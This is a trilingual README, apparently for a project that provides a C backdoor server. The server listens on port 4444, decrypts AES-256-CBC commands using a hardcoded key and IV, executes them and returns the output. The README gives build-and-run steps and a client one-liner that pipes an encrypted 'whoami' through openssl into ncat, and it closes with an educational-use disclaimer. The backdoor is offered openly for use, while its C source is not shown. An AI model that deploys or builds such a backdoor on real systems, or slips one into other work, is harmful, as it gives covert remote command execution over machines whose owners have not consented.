# 🔐 Backdoor AES-256-CBC via OpenSSL + Ncat

Servidor TCP escrito em C que recebe comandos criptografados com AES-256-CBC e os executa, retornando a saída ao cliente.

---

## 📌 Português

### ⚙️ Como funciona:
1. Cliente envia um comando criptografado com AES-256-CBC (base64).
2. Servidor recebe, decifra e executa o comando.
3. A resposta é enviada de volta via TCP.

### 🔐 Parâmetros:
- **Chave (KEY):** `00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff`
- **IV:** `0102030405060708090a0b0c0d0e0f10`
- **Porta:** `4444`

### ▶️ Executando o servidor:
```bash
gcc aes_server.c -o servidor
./servidor
```

### 💻 Cliente (Linux):
```bash
KEY="00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
IV="0102030405060708090a0b0c0d0e0f10"
echo -n "whoami" | openssl enc -aes-256-cbc -a -K $KEY -iv $IV | ncat <IP_DO_SERVIDOR> 4444
```

---

## 📌 English

### ⚙️ How it works:
1. Client encrypts a command using AES-256-CBC (base64 output).
2. Server receives, decrypts, and executes the command.
3. The output is returned via TCP.

### 🔐 Parameters:
- **Key (KEY):** `00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff`
- **IV:** `0102030405060708090a0b0c0d0e0f10`
- **Port:** `4444`

### ▶️ Running the server:
```bash
gcc aes_server.c -o server
./server
```

### 💻 Client (Linux):
```bash
KEY="00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
IV="0102030405060708090a0b0c0d0e0f10"
echo -n "whoami" | openssl enc -aes-256-cbc -a -K $KEY -iv $IV | ncat <SERVER_IP> 4444
```

---

## 📌 العربية

### ⚙️ كيف يعمل:
1. يقوم العميل بتشفير الأمر باستخدام AES-256-CBC (بصيغة base64).
2. يستقبل الخادم الأمر، ويفك تشفيره، ثم ينفذه.
3. يتم إرسال الناتج عبر اتصال TCP إلى العميل.

### 🔐 المعلمات:
- **المفتاح (KEY):** `00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff`
- **IV:** `0102030405060708090a0b0c0d0e0f10`
- **المنفذ (Port):** `4444`

### ▶️ تشغيل الخادم:
```bash
gcc aes_server.c -o الخادم
./الخادم
```

### 💻 العميل (لينكس):
```bash
KEY="00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
IV="0102030405060708090a0b0c0d0e0f10"
echo -n "whoami" | openssl enc -aes-256-cbc -a -K $KEY -iv $IV | ncat <IP_الخادم> 4444
```

---

## ⚠️ AVISO LEGAL | LEGAL DISCLAIMER | ⚠️ إخلاء المسؤولية

### 🇧🇷 Português
Este projeto é fornecido **exclusivamente para fins educacionais** e de **pesquisa em segurança cibernética**.  
Ele deve ser utilizado **somente em ambientes controlados**, como laboratórios, máquinas virtuais ou redes isoladas.  
**Nunca execute este código em sistemas reais sem autorização explícita do proprietário.**  
O autor **não se responsabiliza por qualquer uso indevido** desta ferramenta.

### 🇺🇸 English
This project is provided **for educational and cybersecurity research purposes only**.  
It is intended to be used **only in controlled environments**, such as labs, virtual machines, or isolated networks.  
**Do not run this code on real systems without explicit permission from the owner.**  
The author **is not responsible for any misuse** of this tool.

### 🇸🇦 العربية
يُقدَّم هذا المشروع **لأغراض تعليمية وبحثية فقط** في مجال الأمن السيبراني.  
يُمنع استخدامه إلا في **بيئات معزولة ومسيطر عليها** مثل المختبرات أو الأجهزة الافتراضية.  
**لا يجوز تشغيل هذا الكود على أنظمة حقيقية دون إذن صريح من مالك النظام.**  
المؤلف **غير مسؤول عن أي استخدام خاطئ** لهذه الأداة.

---

## 👤 Autor

Desenvolvido por **Rafael Medeiros**  
🌐 [alby.technology](https://alby.technology)  
🇧🇷 🇦🇪
